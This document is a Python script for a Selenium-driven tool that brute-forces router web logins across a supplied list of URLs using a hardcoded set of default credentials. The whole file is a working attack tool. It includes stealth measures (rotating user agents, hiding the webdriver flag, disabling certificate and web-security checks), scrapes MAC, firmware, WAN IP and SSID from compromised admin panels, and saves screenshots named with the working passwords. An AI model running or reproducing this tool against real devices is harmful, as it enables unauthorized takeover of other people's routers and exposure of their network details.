#!/usr/bin/env python3
"""
Router Brute Force Chrome - Chrome-based Router Brute Force Tool v2.0
Author: Network Security Engineer
Cross-platform: Windows, Linux, macOS
Chrome automation for router brute force attacks with screenshot capture
"""

import os
import sys
import json
import time
import signal
import random
import socket
import argparse
import threading
import re
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import warnings
warnings.filterwarnings('ignore')

# Chrome automation imports
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
    CHROME_AVAILABLE = True
except ImportError:
    CHROME_AVAILABLE = False
    print("Error: Selenium not installed. Please install: pip install selenium")
    sys.exit(1)

# Cross-platform color support
class Colors:
    if os.name == 'nt':  # Windows
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'
    else:  # Linux/macOS
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'

# Global variables
running = True
stats = {'targets_scanned': 0, 'login_pages_found': 0, 'vulnerable_routers': 0, 'start_time': None}

def signal_handler(sig, frame):
    global running
    print(f"\n{Colors.YELLOW}[!] Stopping scanner safely...{Colors.END}")
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Colors.GREEN}{Colors.BOLD}
    ██████╗  ██████╗ ██╗   ██╗████████╗███████╗██████╗     ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
    ██╔══██╗██╔═══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗   ██╔══██╗██╔═══██╗██║   ██║╚══██╔══╝██╔════╝
    ██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██████╔╝   ██████╔╝██║   ██║██║   ██║   ██║   █████╗  
    ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██╔══██╗   ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  
    ██║  ██╗╚██████╔╝╚██████╔╝   ██║   ███████╗██║  ██║   ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗
    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝
    
    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ██████╗ ██╗   ██╗██████╗ ████████╗███████╗
    ██╔══██╗██╔═══██╗██║   ██║╚══██╔══╝██╔════╝   ██╔═══██╗██║   ██║██╔══██╗╚══██╔══╝██╔════╝
    ██████╔╝██║   ██║██║   ██║   ██║   █████╗     ██║   ██║██║   ██║██████╔╝   ██║   █████╗  
    ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝     ██║   ██║██║   ██║██╔══██╗   ██║   ██╔══╝  
    ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗   ╚██████╔╝╚██████╔╝██║  ██║   ██║   ███████╗
    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝
    
    Chrome-based Router Brute Force Tool v2.0
    Author: Network Security Engineer
    Cross-platform: Windows, Linux, macOS
{Colors.END}
"""

# Target credentials
TARGET_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "support180"),
    ("support", "support"),
    ("user", "user"),
    ("admin", "password"),
    ("admin", "1234"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("root", "root"),
    ("root", "admin"),
    ("admin", ""),
    ("", "admin"),
    ("admin", "admin123"),
    ("admin", "password123"),
    ("guest", "guest")
]

# User-Agent rotation for anti-detection
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36'
]

class ChromeRouterBruteForce:
    def __init__(self, login_urls, threads=1, timeout=10, headless=True, enable_screenshot=True):
        self.login_urls = list(set(login_urls))  # Remove duplicates
        self.threads = threads
        self.timeout = timeout
        self.headless = headless
        self.enable_screenshot = enable_screenshot
        self.lock = threading.Lock()
        
    def create_chrome_driver(self):
        """Create Chrome driver with optimized settings"""
        try:
            chrome_options = Options()
            
            if self.headless:
                chrome_options.add_argument('--headless')
            
            # Performance and stealth options
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--disable-logging')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-plugins')
            chrome_options.add_argument('--disable-images')
            chrome_options.add_argument('--disable-javascript')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument('--ignore-ssl-errors')
            chrome_options.add_argument('--ignore-certificate-errors-spki-list')
            chrome_options.add_argument('--ignore-certificate-errors-spki-list')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            # Window size
            chrome_options.add_argument('--window-size=1920,1080')
            
            # Random User-Agent
            chrome_options.add_argument(f'--user-agent={random.choice(USER_AGENTS)}')
            
            # Create driver
            driver = webdriver.Chrome(options=chrome_options)
            
            # Execute script to remove webdriver property
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            return driver
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error creating Chrome driver: {e}{Colors.END}")
            return None
    
    def detect_login_form(self, driver):
        """Detect login form fields on the page"""
        try:
            # Common field name patterns
            username_fields = [
                'username', 'user', 'login', 'admin', 'name', 'email', 'account',
                'userid', 'user_id', 'loginname', 'login_name', 'uname', 'u_name'
            ]
            
            password_fields = [
                'password', 'pass', 'passwd', 'pwd', 'admin', 'secret', 'key',
                'passphrase', 'pword', 'p_word', 'loginpass', 'login_pass'
            ]
            
            username_field = None
            password_field = None
            
            # Try to find username field
            for field_name in username_fields:
                try:
                    field = driver.find_element(By.NAME, field_name)
                    username_field = field
                    break
                except NoSuchElementException:
                    continue
            
            # Try to find password field
            for field_name in password_fields:
                try:
                    field = driver.find_element(By.NAME, field_name)
                    password_field = field
                    break
                except NoSuchElementException:
                    continue
            
            # If not found by name, try by type
            if not username_field:
                try:
                    username_field = driver.find_element(By.CSS_SELECTOR, 'input[type="text"], input[type="email"]')
                except NoSuchElementException:
                    pass
            
            if not password_field:
                try:
                    password_field = driver.find_element(By.CSS_SELECTOR, 'input[type="password"]')
                except NoSuchElementException:
                    pass
            
            return username_field, password_field
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error detecting login form: {e}{Colors.END}")
            return None, None
    
    def find_submit_button(self, driver):
        """Find submit button for login form"""
        try:
            # Common submit button selectors
            submit_selectors = [
                "//input[@type='submit']",
                "//button[@type='submit']",
                "//input[@value='Login']",
                "//button[contains(text(), 'Login')]",
                "//input[@value='Sign In']",
                "//button[contains(text(), 'Sign In')]",
                "//input[@value='Submit']",
                "//button[contains(text(), 'Submit')]",
                "//input[@value='Enter']",
                "//button[contains(text(), 'Enter')]",
                "//input[@value='OK']",
                "//button[contains(text(), 'OK')]",
                "//button[contains(@class, 'login')]",
                "//button[contains(@class, 'submit')]",
                "//input[contains(@class, 'login')]",
                "//input[contains(@class, 'submit')]"
            ]
            
            for selector in submit_selectors:
                try:
                    button = driver.find_element(By.XPATH, selector)
                    return button
                except NoSuchElementException:
                    continue
            
            return None
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error finding submit button: {e}{Colors.END}")
            return None
    
    def test_credentials_with_chrome(self, url, username, password):
        """Test credentials using Chrome automation"""
        driver = None
        try:
            print(f"{Colors.CYAN}[>] Testing: {username}:{password}{Colors.END}")
            
            # Create Chrome driver
            driver = self.create_chrome_driver()
            if not driver:
                return False, None, None
            
            # Navigate to URL
            driver.get(url)
            time.sleep(3)  # Wait for page to load
            
            # Get initial page info
            initial_url = driver.current_url
            initial_title = driver.title
            
            # Detect login form
            username_field, password_field = self.detect_login_form(driver)
            
            if not username_field or not password_field:
                print(f"{Colors.YELLOW}[-] No login form found{Colors.END}")
                return False, None, None
            
            # Fill login form
            try:
                username_field.clear()
                username_field.send_keys(username)
                time.sleep(0.5)
                
                password_field.clear()
                password_field.send_keys(password)
                time.sleep(0.5)
                
                # Find and click submit button
                submit_button = self.find_submit_button(driver)
                if submit_button:
                    submit_button.click()
                else:
                    # Try pressing Enter on password field
                    password_field.send_keys("\n")
                
                # Wait for page to load after login
                time.sleep(5)
                
            except Exception as e:
                print(f"{Colors.YELLOW}[-] Error filling form: {e}{Colors.END}")
                return False, None, None
            
            # Check if login was successful
            current_url = driver.current_url
            current_title = driver.title
            page_source = driver.page_source.lower()
            
            # Check for success indicators
            success_indicators = [
                'dashboard', 'admin', 'control panel', 'configuration', 'settings',
                'system', 'status', 'network', 'router', 'gateway', 'modem',
                'welcome', 'main menu', 'logout', 'log out'
            ]
            
            # Check for failure indicators
            failure_indicators = [
                'invalid', 'incorrect', 'failed', 'error', 'denied', 'wrong',
                'login failed', 'authentication failed', 'access denied',
                'username', 'password', 'enter credentials', 'sign in'
            ]
            
            success_count = sum(1 for indicator in success_indicators if indicator in page_source)
            failure_count = sum(1 for indicator in failure_indicators if indicator in page_source)
            
            # Check if URL changed (good sign)
            url_changed = current_url != initial_url
            
            # Check if we're still on login page
            still_on_login = any(login_word in current_url.lower() for login_word in ['login', 'signin', 'auth', 'authentication'])
            
            # Determine if login was successful
            if (success_count > failure_count and success_count >= 2) or (url_changed and not still_on_login):
                print(f"{Colors.GREEN}[+] Login successful!{Colors.END}")
                return True, current_url, driver
            else:
                print(f"{Colors.YELLOW}[-] Login failed{Colors.END}")
                return False, None, None
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error testing credentials: {e}{Colors.END}")
            return False, None, None
        finally:
            if driver:
                driver.quit()
    
    def take_screenshot(self, driver, url, username, password, ip_address):
        """Take screenshot of admin panel"""
        try:
            # Take screenshot with IP in filename
            ip_clean = ip_address.replace('.', '_').replace(':', '_')
            screenshot_filename = f"screenshot_{ip_clean}_{username}_{password}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            driver.save_screenshot(screenshot_filename)
            
            print(f"{Colors.GREEN}[+] Screenshot saved: {screenshot_filename}{Colors.END}")
            return screenshot_filename
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Screenshot failed: {e}{Colors.END}")
            return None
    
    def extract_router_info(self, driver):
        """Extract router information from admin panel"""
        info = {}
        
        try:
            # Get page title
            info['page_title'] = driver.title
            
            # Get current URL
            info['current_url'] = driver.current_url
            
            # Get page source for text extraction
            page_source = driver.page_source
            
            # Extract MAC address
            mac_patterns = [
                r'mac[^:]*:?\s*([0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2})',
                r'([0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2})',
                r'physical.*?address[^:]*:?\s*([0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2})'
            ]
            
            for pattern in mac_patterns:
                match = re.search(pattern, page_source, re.IGNORECASE)
                if match:
                    info['mac_address'] = match.group(1)
                    break
            
            # Extract firmware version
            firmware_patterns = [
                r'firmware[^:]*:?\s*([v\d\.\-]+)',
                r'version[^:]*:?\s*([v\d\.\-]+)',
                r'firmware.*?(\d+\.\d+\.\d+)',
                r'software[^:]*:?\s*([v\d\.\-]+)'
            ]
            
            for pattern in firmware_patterns:
                match = re.search(pattern, page_source, re.IGNORECASE)
                if match:
                    info['firmware_version'] = match.group(1)
                    break
            
            # Extract model
            model_patterns = [
                r'model[^:]*:?\s*([A-Z0-9\-_]+)',
                r'device[^:]*:?\s*([A-Z0-9\-_]+)',
                r'product[^:]*:?\s*([A-Z0-9\-_]+)',
                r'type[^:]*:?\s*([A-Z0-9\-_]+)'
            ]
            
            for pattern in model_patterns:
                match = re.search(pattern, page_source, re.IGNORECASE)
                if match:
                    info['model'] = match.group(1)
                    break
            
            # Extract WAN IP
            wan_ip_patterns = [
                r'wan.*?(\d+\.\d+\.\d+\.\d+)',
                r'external.*?(\d+\.\d+\.\d+\.\d+)',
                r'internet.*?(\d+\.\d+\.\d+\.\d+)',
                r'public.*?(\d+\.\d+\.\d+\.\d+)'
            ]
            
            for pattern in wan_ip_patterns:
                match = re.search(pattern, page_source, re.IGNORECASE)
                if match:
                    info['wan_ip'] = match.group(1)
                    break
            
            # Extract SSID
            ssid_patterns = [
                r'ssid[^:]*:?\s*([A-Za-z0-9\-_]+)',
                r'network.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)',
                r'wireless.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)',
                r'wifi.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)'
            ]
            
            for pattern in ssid_patterns:
                match = re.search(pattern, page_source, re.IGNORECASE)
                if match:
                    info['ssid'] = match.group(1)
                    break
            
            return info
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error extracting router info: {e}{Colors.END}")
            return {}
    
    def brute_force_single_url(self, login_url):
        """Brute force a single login URL using Chrome"""
        result = {'url': login_url, 'vulnerabilities': []}
        
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
            print(f"{Colors.CYAN}[*] CHROME BRUTE FORCING: {login_url}{Colors.END}")
            print(f"{Colors.CYAN}{'='*60}{Colors.END}")
            
            # Parse URL to get IP
            parsed_url = urlparse(login_url)
            ip = parsed_url.hostname
            
            # Test each credential combination
            vulnerability_found = False
            
            for username, password in TARGET_CREDENTIALS:
                if not running or vulnerability_found:
                    break
                
                # Test credentials with Chrome
                success, admin_url, driver = self.test_credentials_with_chrome(login_url, username, password)
                
                if success and driver:
                    print(f"{Colors.GREEN}[+] Admin access verified!{Colors.END}")
                    print(f"{Colors.RED}🔒 VULNERABLE: {username}:{password} works!{Colors.END}")
                    print(f"{Colors.GREEN}[+] Admin URL: {admin_url}{Colors.END}")
                    
                    # Extract router information
                    router_info = self.extract_router_info(driver)
                    
                    # Display extracted information
                    if router_info:
                        print(f"{Colors.YELLOW}[*] Router Information:{Colors.END}")
                        for key, value in router_info.items():
                            if value and value != "Unknown":
                                print(f"{Colors.MAGENTA}[+] {key.replace('_', ' ').title()}: {value}{Colors.END}")
                    
                    # Take screenshot
                    screenshot_file = None
                    if self.enable_screenshot:
                        print(f"{Colors.CYAN}[*] Taking screenshot...{Colors.END}")
                        screenshot_file = self.take_screenshot(driver, admin_url, username, password, ip)
                    
                    # Create vulnerability record
                    vulnerability = {
                        'type': 'Default Credentials',
                        'credentials': f"{username}:{password}",
                        'admin_url': admin_url,
                        'router_info': router_info,
                        'verified': True,
                        'screenshot': screenshot_file
                    }
                    result['vulnerabilities'].append(vulnerability)
                    
                    with self.lock:
                        stats['vulnerable_routers'] += 1
                    
                    vulnerability_found = True
                    break
                else:
                    print(f"{Colors.YELLOW}[-] {username}:{password} failed{Colors.END}")
            
            if not vulnerability_found:
                print(f"{Colors.RED}[-] No valid credentials found{Colors.END}")
            
            # Update stats
            with self.lock:
                stats['targets_scanned'] += 1
                stats['login_pages_found'] += 1
            
            print(f"{Colors.GREEN}[+] URL {login_url} brute force completed{Colors.END}")
            return result
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error brute forcing {login_url}: {e}{Colors.END}")
            return result
    
    def run_brute_force(self):
        """Run brute force attack on all URLs"""
        print("-" * 80)
        
        all_results = []
        
        # Process URLs one by one for organized output
        for i, url in enumerate(self.login_urls):
            if not running:
                break
            
            result = self.brute_force_single_url(url)
            if result:
                all_results.append(result)
            
            # Update progress
            completed = i + 1
            progress = (completed / len(self.login_urls)) * 100
            
            print(f"{Colors.MAGENTA}[*] Progress: {completed}/{len(self.login_urls)} ({progress:.1f}%) - "
                  f"URLs tested: {stats['targets_scanned']}, Vulnerable: {stats['vulnerable_routers']}{Colors.END}")
        
        return all_results

def parse_login_urls(url_input):
    """Parse login URLs from input"""
    urls = []
    
    if url_input.endswith('.txt'):  # File
        try:
            with open(url_input, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!] File not found: {url_input}{Colors.END}")
            return []
    else:  # Single URL or comma-separated URLs
        urls = [url.strip() for url in url_input.split(',') if url.strip()]
    
    return urls

def main():
    parser = argparse.ArgumentParser(description="Router Brute Force Chrome v2.0 - Chrome-based Router Brute Force Tool")
    parser.add_argument('-u', '--urls', required=True, help='Login URL(s): single URL, comma-separated URLs, or file')
    parser.add_argument('-T', '--threads', type=int, default=1, help='Number of threads (default: 1)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--no-headless', action='store_true', help='Run Chrome in visible mode (default: headless)')
    parser.add_argument('--no-screenshot', action='store_true', help='Disable screenshot capture (default: enabled)')
    
    args = parser.parse_args()
    
    clear_screen()
    print_banner()
    
    if not CHROME_AVAILABLE:
        print(f"{Colors.RED}[!] Chrome automation not available. Please install selenium and chromedriver.{Colors.END}")
        return
    
    login_urls = parse_login_urls(args.urls)
    if not login_urls:
        print(f"{Colors.RED}[!] No valid login URLs found{Colors.END}")
        return
    
    # Startup info
    print(f"{Colors.GREEN}[+] Loaded {len(login_urls)} login URLs{Colors.END}")
    creds_str = ", ".join([f"{u}:{p}" for u,p in TARGET_CREDENTIALS[:5]])  # Show first 5
    print(f"{Colors.YELLOW}[*] Target credentials: {creds_str}...{Colors.END}")
    print(f"{Colors.BLUE}[*] Chrome-based brute force with screenshot capture{Colors.END}")
    print(f"{Colors.MAGENTA}[*] Workflow: Chrome → Login Form Detection → Credential Testing → Screenshot{Colors.END}")
    
    enable_screenshot = not args.no_screenshot
    headless = not args.no_headless
    
    brute_force = ChromeRouterBruteForce(login_urls, args.threads, args.timeout, headless, enable_screenshot)
    stats['start_time'] = time.time()
    
    try:
        results = brute_force.run_brute_force()
        
        if results:
            total_time = time.time() - stats['start_time']
            
            print(f"\n{Colors.GREEN}{'='*60}{Colors.END}")
            print(f"{Colors.GREEN}[+] CHROME BRUTE FORCE COMPLETE!{Colors.END}")
            print(f"{Colors.GREEN}{'='*60}{Colors.END}")
            print(f"{Colors.YELLOW}[*] Summary:{Colors.END}")
            print(f"  - Total URLs tested: {Colors.CYAN}{len(results)}{Colors.END}")
            print(f"  - Login pages found: {Colors.BLUE}{stats['login_pages_found']}{Colors.END}")
            print(f"  - Vulnerable routers: {Colors.RED}{stats['vulnerable_routers']}{Colors.END}")
            if stats['vulnerable_routers']:
                print("  - Vulnerable list:")
                for res in results:
                    if res.get('vulnerabilities'):
                        v = res['vulnerabilities'][0]
                        print(f"    • {Colors.WHITE}{res['url']}{Colors.END} -> {Colors.RED}{v['credentials']}{Colors.END}")
            print(f"  - Attack duration: {Colors.MAGENTA}{total_time:.1f}{Colors.END} seconds")
            print(f"  - Average speed: {Colors.YELLOW}{len(results)/total_time:.1f}{Colors.END} URLs/second")
            print(f"{Colors.GREEN}[*] Chrome-based brute force completed successfully{Colors.END}")
            
        else:
            print(f"{Colors.RED}[!] No results to report{Colors.END}")
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Brute force interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error during brute force: {e}{Colors.END}")

if __name__ == "__main__":
    main()